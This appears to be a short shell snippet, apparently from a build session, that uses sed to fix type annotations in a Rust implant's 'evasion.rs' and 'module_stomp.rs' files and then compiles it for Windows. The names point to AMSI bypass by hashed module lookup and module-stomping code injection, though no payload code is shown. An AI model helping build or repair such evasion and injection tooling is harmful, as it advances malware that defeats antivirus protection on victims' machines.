sed -i 's/let ntdll = pe_resolve::get_module_handle_by_hash/let ntdll: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash/g' agent/src/evasion.rs
sed -i 's/let amsi = pe_resolve::get_module_handle_by_hash/let amsi: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash/g' agent/src/evasion.rs
sed -i 's/IMAGE_FIRST_SECTION,//g' agent/src/injection/module_stomp.rs
sed -i 's/IMAGE_NT_HEADERS32,//g' agent/src/injection/module_stomp.rs
cargo check -p agent --target x86_64-pc-windows-gnu 
